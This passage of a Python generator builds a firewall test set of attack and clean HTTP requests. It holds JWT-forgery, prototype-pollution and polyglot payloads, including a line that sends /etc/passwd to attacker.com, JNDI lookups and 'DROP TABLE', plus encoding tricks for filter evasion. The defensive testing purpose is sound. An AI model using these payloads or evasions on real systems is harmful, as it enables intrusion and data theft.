    "?constructor.prototype.isAdmin=true",
    "{\"foo\":\"bar\",\"__proto__\":{\"polluted\":true}}",
]

PAYLOADS_JWT_ABUSE = [
    # alg=none
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
    # Empty signature
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
    # HS256 forged with hardcoded weak secret
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signed",
    # kid SQL-injection
    "eyJhbGciOiJIUzI1NiIsImtpZCI6IjEgVU5JT04gU0VMRUNUICdzZWNyZXQnLS0ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.X",
    # kid traversal
    "eyJraWQiOiIuLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCJ9.eyJ1IjoiYWRtaW4ifQ.X",
]

PAYLOADS_WEBSOCKET = [
    # Upgrade-bound smuggling / CSRF
    "GET / HTTP/1.1\r\nHost: localhost\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nOrigin: http://attacker.com\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n",
    "Upgrade: websocket\r\nConnection: Upgrade\r\nOrigin: null\r\n",
]

# ---------------------------------------------------------------------------
# Obfuscation primitives
# ---------------------------------------------------------------------------

def url_encode(s: str) -> str:
    return urllib.parse.quote(s, safe="")

def double_url_encode(s: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")

def triple_url_encode(s: str) -> str:
    return urllib.parse.quote(double_url_encode(s), safe="")

def hex_encode(s: str) -> str:
    return "".join("%" + format(ord(c), "02X") for c in s)

def unicode_escape(s: str) -> str:
    out = []
    for c in s:
        if c.isalnum():
            out.append(c)
        else:
            out.append("\\u{:04x}".format(ord(c)))
    return "".join(out)

def case_swap(s: str) -> str:
    out = []
    for i, c in enumerate(s):
        if c.isalpha():
            out.append(c.upper() if i % 2 == 0 else c.lower())
        else:
            out.append(c)
    return "".join(out)

def insert_sql_comments(s: str) -> str:
    # break apart SQL keywords with inline comments
    return (s.replace("UNION", "UN/**/ION")
             .replace("SELECT", "SE/**/LECT")
             .replace("FROM", "FR/**/OM")
             .replace("OR", "O/**/R")
             .replace("AND", "AN/**/D"))

def whitespace_obf(s: str) -> str:
    return (s.replace(" ", "/**/")
             .replace("\t", "/**/")
             .replace("OR", "OR\t"))

def tab_obf(s: str) -> str:
    return s.replace(" ", "\t")

def newline_obf(s: str) -> str:
    return s.replace(" ", "%0a")

def base64_wrap(s: str) -> str:
    return base64.b64encode(s.encode()).decode()

def html_entity_encode(s: str) -> str:
    return "".join(("&#{};".format(ord(c)) if not c.isalnum() else c) for c in s)

def html_hex_entity(s: str) -> str:
    return "".join(("&#x{:x};".format(ord(c)) if not c.isalnum() else c) for c in s)

OBFUSCATIONS: list[tuple[str, Callable[[str], str]]] = [
    ("none", lambda s: s),
    ("urlenc", url_encode),
    ("urlenc2x", double_url_encode),
    ("urlenc3x", triple_url_encode),
    ("hex", hex_encode),
    ("uniesc", unicode_escape),
    ("case", case_swap),
    ("sqlcomment", insert_sql_comments),
    ("ws", whitespace_obf),
    ("tab", tab_obf),
    ("newline", newline_obf),
    ("html_dec", html_entity_encode),
    ("html_hex", html_hex_entity),
]

# Obfuscations only meaningful for certain classes
OBF_BY_CLASS: dict[str, list[str]] = {
    "sqli":            ["none", "urlenc", "urlenc2x", "hex", "case", "sqlcomment", "ws", "newline"],
    "xss":             ["none", "urlenc", "urlenc2x", "html_dec", "html_hex", "case", "uniesc"],
    "path_traversal":  ["none", "urlenc", "urlenc2x", "urlenc3x", "hex", "uniesc"],
    "ssrf":            ["none", "urlenc", "urlenc2x", "case"],
    "command_injection": ["none", "urlenc", "urlenc2x", "newline", "tab"],
    "header_injection":["none", "urlenc"],
    "xxe":             ["none", "urlenc"],
    "ssti":            ["none", "urlenc", "html_dec"],
    "ldap_injection":  ["none", "urlenc"],
    "nosql_injection": ["none", "urlenc"],
    "log4shell":       ["none", "urlenc", "case"],
    "open_redirect":   ["none", "urlenc", "urlenc2x"],
    "recon":           ["none", "case"],
    "graphql_abuse":   ["none", "urlenc"],
    "rce_deserialization": ["none"],
    "prototype_pollution": ["none", "urlenc"],
    "jwt_abuse":       ["none"],
    "websocket":       ["none"],
    "http_smuggling":  ["none"],
}

# ---------------------------------------------------------------------------
# Class spec: payload corpus, paths, methods, target slot (query / body /
# path / header), target count.
# ---------------------------------------------------------------------------

ClassSpec = dict

CLASSES: list[ClassSpec] = [
    {"name": "sqli",                "payloads": PAYLOADS_SQLI,            "paths": PATHS_GENERIC_WEB + PATHS_GENERIC_API,         "methods": ["GET", "POST"],    "slot": "query_or_body",   "target_count": 18000, "expected_action": "block"},
    {"name": "xss",                 "payloads": PAYLOADS_XSS,             "paths": PATHS_GENERIC_WEB + PATHS_GENERIC_API,         "methods": ["GET", "POST"],    "slot": "query_or_body",   "target_count": 18000, "expected_action": "block"},
    {"name": "path_traversal",      "payloads": PAYLOADS_PATH_TRAVERSAL,  "paths": PATHS_FILES + PATHS_GENERIC_API,               "methods": ["GET"],            "slot": "query",           "target_count": 14000, "expected_action": "block"},
    {"name": "ssrf",                "payloads": PAYLOADS_SSRF,            "paths": PATHS_PROXY,                                   "methods": ["GET", "POST"],    "slot": "query_or_body",   "target_count": 14000, "expected_action": "block"},
    {"name": "command_injection",   "payloads": PAYLOADS_CMD_INJECTION,   "paths": PATHS_GENERIC_API + ["/api/ping", "/exec"],    "methods": ["GET", "POST"],    "slot": "query_or_body",   "target_count": 14000, "expected_action": "block"},
    {"name": "header_injection",    "payloads": PAYLOADS_HEADER_INJECTION,"paths": PATHS_HEADER_TARGET,                           "methods": ["GET", "POST"],    "slot": "header",          "target_count": 6000,  "expected_action": "block"},
    {"name": "xxe",                 "payloads": PAYLOADS_XXE,             "paths": PATHS_GENERIC_API + ["/upload", "/import"],    "methods": ["POST", "PUT"],    "slot": "body",            "target_count": 8000,  "expected_action": "block"},
    {"name": "ssti",                "payloads": PAYLOADS_SSTI,            "paths": PATHS_GENERIC_WEB,                             "methods": ["GET", "POST"],    "slot": "query_or_body",   "target_count": 10000, "expected_action": "block"},
    {"name": "ldap_injection",      "payloads": PAYLOADS_LDAP,            "paths": PATHS_AUTH + ["/api/ldap"],                    "methods": ["GET", "POST"],    "slot": "query_or_body",   "target_count": 6000,  "expected_action": "block"},
    {"name": "nosql_injection",     "payloads": PAYLOADS_NOSQL,           "paths": PATHS_AUTH + PATHS_GENERIC_API,                "methods": ["GET", "POST"],    "slot": "query_or_body",   "target_count": 6000,  "expected_action": "block"},
    {"name": "log4shell",           "payloads": PAYLOADS_LOG4SHELL,       "paths": PATHS_GENERIC_API + PATHS_GENERIC_WEB,         "methods": ["GET", "POST"],    "slot": "query_or_header", "target_count": 4000,  "expected_action": "block"},
    {"name": "open_redirect",       "payloads": PAYLOADS_OPEN_REDIRECT,   "paths": PATHS_REDIRECT,                                "methods": ["GET"],            "slot": "query",           "target_count": 6000,  "expected_action": "block"},
    {"name": "http_smuggling",      "payloads": PAYLOADS_HTTP_SMUGGLING,  "paths": PATHS_GENERIC_API,                             "methods": ["POST"],           "slot": "body",            "target_count": 3000,  "expected_action": "block"},
    {"name": "recon",               "payloads": PATHS_RECON,              "paths": ["/"],                                         "methods": ["GET"],            "slot": "path",            "target_count": 22000, "expected_action": "block"},
    {"name": "graphql_abuse",       "payloads": PAYLOADS_GRAPHQL,         "paths": PATHS_GRAPHQL,                                 "methods": ["POST"],           "slot": "body",            "target_count": 4000,  "expected_action": "block"},
    {"name": "rce_deserialization", "payloads": PAYLOADS_RCE_DESERIALIZATION, "paths": PATHS_GENERIC_API,                         "methods": ["POST"],           "slot": "body",            "target_count": 4000,  "expected_action": "block"},
    {"name": "prototype_pollution", "payloads": PAYLOADS_PROTOTYPE_POLLUTION, "paths": PATHS_GENERIC_API + PATHS_GENERIC_WEB,     "methods": ["GET", "POST"],    "slot": "query_or_body",   "target_count": 4000,  "expected_action": "block"},
    {"name": "jwt_abuse",           "payloads": PAYLOADS_JWT_ABUSE,       "paths": PATHS_GENERIC_API,                             "methods": ["GET"],            "slot": "auth_header",     "target_count": 3000,  "expected_action": "block"},
    {"name": "websocket",           "payloads": PAYLOADS_WEBSOCKET,       "paths": ["/ws", "/socket", "/api/ws"],                 "methods": ["GET"],            "slot": "header",          "target_count": 2000,  "expected_action": "block"},
]
# Total: 18+18+14+14+14+6+8+10+6+6+4+6+3+22+4+4+4+3+2 = 166k.  Top up
# with a polyglot/evasion class to hit ~200k.
PAYLOADS_POLYGLOT = [
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "'/**/UNION/**/SELECT/**/<script>alert(1)</script>--",
    "1'; DROP TABLE users-- <script>alert(1)</script>",
    "../../../etc/passwd?q=<svg/onload=alert(1)>",
    "${jndi:ldap://attacker.com/${' UNION SELECT user()--'}}",
    "<svg onload=alert(1)>'; SELECT pg_sleep(5);--",
    "{{7*7}}<script>alert(1)</script>${jndi:ldap://x}",
    "id;cat /etc/passwd | curl http://attacker.com/$(whoami | base64)",
]
CLASSES.append({"name": "polyglot",          "payloads": PAYLOADS_POLYGLOT,        "paths": PATHS_GENERIC_WEB + PATHS_GENERIC_API,         "methods": ["GET", "POST"],    "slot": "query_or_body",   "target_count": 16000, "expected_action": "block"})
CLASSES.append({"name": "evasion_chain",     "payloads": PAYLOADS_SQLI + PAYLOADS_XSS + PAYLOADS_SSRF + PAYLOADS_CMD_INJECTION, "paths": PATHS_GENERIC_WEB + PATHS_GENERIC_API + PATHS_FILES, "methods": ["GET", "POST"], "slot": "query_or_body", "target_count": 18000, "expected_action": "block"})
# 166k + 16k + 18k = 200k

# Clean baseline corpus (false-positive bait — must NOT be blocked)
CLEAN_PATHS = [
    "/", "/about", "/contact", "/support", "/help", "/docs",
    "/api/v1/products", "/api/v1/orders/42", "/api/users/me",
    "/api/posts", "/api/posts/123", "/api/products?page=2",
    "/api/products?category=electronics&sort=price",
    "/search?q=database", "/search?q=login", "/search?q=admin",
    "/search?q=hello+world", "/search?q=french+press+coffee+maker",
    "/products?filter=name:phone", "/checkout/review",
    "/articles/getting-started-with-vue", "/blog/2024/12/release-notes",
    "/static/css/main.css", "/static/js/app.js", "/favicon.ico",
    "/robots.txt", "/sitemap.xml", "/images/logo.png",
    "/api/v1/health", "/api/v1/status",
]
CLEAN_TARGET = 10_000

# ---------------------------------------------------------------------------
# Case generator
# ---------------------------------------------------------------------------

def stable_id(prefix: str, blob: str, idx: int) -> str:
    h = hashlib.sha1(f"{prefix}|{idx}|{blob}".encode()).hexdigest()[:10]
    return f"{prefix}-{h}"

def pick(rng: random.Random, pool: list):
    return pool[rng.randrange(len(pool))]

def random_qs_param(rng: random.Random) -> str:
    return pick(rng, ["q", "id", "u", "user", "search", "query",
                      "filter", "name", "page", "url", "next",
                      "redirect", "path", "file", "data", "value"])

def build_qs(rng: random.Random, payload: str, *, param: str | None = None) -> str:
    p = param or random_qs_param(rng)
    return f"{p}={payload}"

def build_body(rng: random.Random, payload: str, *, kind: str = "form") -> tuple[str, str]:
    """Return (content_type, body)."""
    if kind == "json":
        param = random_qs_param(rng)
        body = json.dumps({param: payload})
        return "application/json", body
    if kind == "xml":
        return "application/xml", payload
    # form-encoded
    param = random_qs_param(rng)
    return "application/x-www-form-urlencoded", f"{param}={urllib.parse.quote(payload)}"

def random_legit_headers(rng: random.Random) -> dict:
    return {
        "user-agent": pick(rng, USER_AGENTS_LEGIT),
        "accept": pick(rng, ACCEPT_HEADERS),
        "x-forwarded-for": pick(rng, XFF_IPS_PUBLIC),
    }

def random_scanner_headers(rng: random.Random) -> dict:
    return {
        "user-agent": pick(rng, USER_AGENTS_SCANNER),
        "accept": pick(rng, ACCEPT_HEADERS),
        "x-forwarded-for": pick(rng, XFF_IPS_PUBLIC),
    }

def apply_obf(payload: str, klass: str, rng: random.Random) -> tuple[str, str]:
    allowed = OBF_BY_CLASS.get(klass, ["none"])
    obf_name = pick(rng, allowed)
    fn = dict(OBFUSCATIONS)[obf_name]
    try:
        return obf_name, fn(payload)
    except Exception:
        return "none", payload

def generate_case(klass_spec: ClassSpec, idx: int, rng: random.Random) -> dict:
    klass = klass_spec["name"]
    base = pick(rng, klass_spec["payloads"])
    obf_name, payload = apply_obf(base, klass, rng)
    method = pick(rng, klass_spec["methods"])
    path = pick(rng, klass_spec["paths"])
    slot = klass_spec["slot"]
    # Decide where the payload lands
    headers = random_scanner_headers(rng) if rng.random() < 0.25 else random_legit_headers(rng)
    body: str | None = None
    content_type: str | None = None
    query: str | None = None
    if slot == "query":
        query = build_qs(rng, payload)
    elif slot == "body":
        body_kind = "xml" if klass == "xxe" else ("json" if rng.random() < 0.6 else "form")
        content_type, body = build_body(rng, payload, kind=body_kind)
    elif slot == "query_or_body":
        if method == "GET" or rng.random() < 0.5:
            query = build_qs(rng, payload)
        else:
            content_type, body = build_body(rng, payload, kind=("json" if rng.random() < 0.5 else "form"))
    elif slot == "header":
        if klass == "header_injection":
            headers[pick(rng, ["x-custom-header", "x-original-url",
                               "x-rewrite-url", "x-forwarded-host", "host"])] = payload
        else:
            headers["x-original-url"] = payload
    elif slot == "query_or_header":
        if rng.random() < 0.5:
            query = build_qs(rng, payload)
        else:
            headers[pick(rng, ["referer", "x-api-version", "user-agent"])] = (
                headers.get("user-agent", "") + " " + payload
            )
    elif slot == "auth_header":
        headers["authorization"] = f"Bearer {payload}"
    elif slot == "path":
        path = payload if payload.startswith("/") else "/" + payload
    if content_type:
        headers["content-type"] = content_type
    case = {
        "id": stable_id(klass, base + path + (query or "") + (body or "")[:50], idx),
        "class": klass,
        "label": f"{klass} · obf={obf_name}",
        "method": method,
        "path": path,
        "expected_action": klass_spec["expected_action"],
        "expected_rule": klass,
        "obf": obf_name,
        "base_payload": base[:80] + ("..." if len(base) > 80 else ""),
    }
    if query is not None:
        case["query"] = query
    if body is not None:
        case["body"] = body
    case["headers"] = headers
    return case

def generate_clean_case(idx: int, rng: random.Random) -> dict:
    path_or_qs = pick(rng, CLEAN_PATHS)
    # Split path from optional ?query
    if "?" in path_or_qs:
        path, query = path_or_qs.split("?", 1)
    else:
        path, query = path_or_qs, None
    method = "GET" if rng.random() < 0.8 else "POST"
    headers = random_legit_headers(rng)
    body: str | None = None
    if method == "POST":
        body_kind = "json" if rng.random() < 0.6 else "form"
        content_type, body = build_body(rng, pick(rng, ["test", "hello", "value"]), kind=body_kind)
        headers["content-type"] = content_type
    case = {
        "id": stable_id("clean", path + (query or "") + (body or ""), idx),
        "class": "clean",
        "label": "legitimate traffic",
        "method": method,
        "path": path,
        "expected_action": "allow",
        "expected_rule": None,
    }
    if query is not None:
        case["query"] = query
    if body is not None:
        case["body"] = body
    case["headers"] = headers
    return case

# ---------------------------------------------------------------------------
# Driver
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--count", type=int, default=200_000,
                    help="Total attack cases (default 200k)")
    ap.add_argument("--clean-count", type=int, default=10_000,
                    help="Total clean baselines (default 10k)")
    ap.add_argument("--out-dir", default=str(Path(__file__).resolve().parents[1]))
    args = ap.parse_args()
    rng = random.Random(args.seed)

    out_dir = Path(args.out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    attacks_path = out_dir / "attacks_v4.ndjson"
    clean_path = out_dir / "clean_baselines_v4.ndjson"
    meta_path = out_dir / "attacks_v4.meta.json"

    # Scale per-class target counts proportionally to args.count
    declared_total = sum(c["target_count"] for c in CLASSES)
    scale = args.count / declared_total

    counts: dict[str, int] = {}
    # Dedup keys on CONTENT (what the HTTP replayer actually
    # sends), not the synthetic `id` field — IDs include a global
    # counter so two byte-identical cases would have different
    # IDs and slip past an id-only dedup.
    seen_content: set[int] = set()

    def content_hash(c: dict) -> int:
        return hash((
            c["method"],
            c["path"],
            c.get("query", ""),
            c.get("body", ""),
            tuple(sorted(c["headers"].items())),
        ))

    print(f"writing attacks to {attacks_path}")
    with attacks_path.open("w") as fh:
        idx_global = 0
        for klass_spec in CLASSES:
            target = max(1, int(round(klass_spec["target_count"] * scale)))
            written = 0
            attempts = 0
            # Generous attempt budget — small classes (websocket,
            # http_smuggling) have tiny base corpora so the
            # collision rate climbs as the target approaches the
            # combinatorial ceiling. 20× target covers it.
            max_attempts = target * 20
            while written < target and attempts < max_attempts:
                attempts += 1
                idx_global += 1
                case = generate_case(klass_spec, idx_global, rng)
                ch = content_hash(case)
                if ch in seen_content:
                    continue
                seen_content.add(ch)
                fh.write(json.dumps(case, separators=(",", ":")) + "\n")
                written += 1
            if written < target:
                print(f"  {klass_spec['name']:<22} {written:>6} "
                      f"(combinatorial ceiling — payloads×paths×obfs×headers ran out)")
            else:
                print(f"  {klass_spec['name']:<22} {written:>6}")
            counts[klass_spec["name"]] = written
    print(f"writing clean baselines to {clean_path}")
    seen_clean: set[int] = set()
    written_clean = 0
    attempts = 0
    max_attempts = args.clean_count * 50  # small pool → high attempts
    with clean_path.open("w") as fh:
        idx = 0
        while written_clean < args.clean_count and attempts < max_attempts:
            attempts += 1
            idx += 1
            case = generate_clean_case(idx, rng)
            ch = content_hash(case)
            if ch in seen_clean:
                continue
            seen_clean.add(ch)
            fh.write(json.dumps(case, separators=(",", ":")) + "\n")
            written_clean += 1
    if written_clean < args.clean_count:
        print(f"  (clean ceiling reached at {written_clean:,} — small path×header pool)")

    meta = {
        "version": "4.0",
        "seed": args.seed,
        "total_attacks": sum(counts.values()),
        "total_clean": args.clean_count,
        "per_class": counts,
        "generator": "tests/security/dataset/generator/generate_v4.py",
        "obfuscations_in_use": [name for name, _ in OBFUSCATIONS],
        "obfuscations_per_class": OBF_BY_CLASS,
        "notes": [
            "NDJSON: one case per line — stream with python -c \"import json,sys;[print(json.loads(l)['class']) for l in sys.stdin]\" < attacks_v4.ndjson",
            "Stable IDs derived from sha1(class|idx|payload+path+query+body). Re-running with the same --seed reproduces byte-identical IDs.",
            "Each case has {id, class, label, method, path, headers, [query], [body], expected_action, expected_rule, obf, base_payload}.",
            "Headers include user-agent (legit pool ~75% / scanner pool ~25%), accept, x-forwarded-for from a 22-IP pool, plus class-specific content-type / authorization / x-original-url etc.",
            "Clean baselines (clean_baselines_v4.ndjson) are FP-prone: legitimate paths with realistic browser headers. They MUST be allowed by the WAF.",
            "Obfuscation primitives applied per-class: url/double/triple url-encode, hex, unicode escape, case swap, sql comment insertion, whitespace/tab/newline tricks, html dec/hex entities, base64 wrap.",
        ],
    }
    meta_path.write_text(json.dumps(meta, indent=2))
    print(f"wrote meta to {meta_path}")
    print(f"\nDONE: {sum(counts.values()):,} attacks, {args.clean_count:,} clean cases.")

if __name__ == "__main__":
    main()
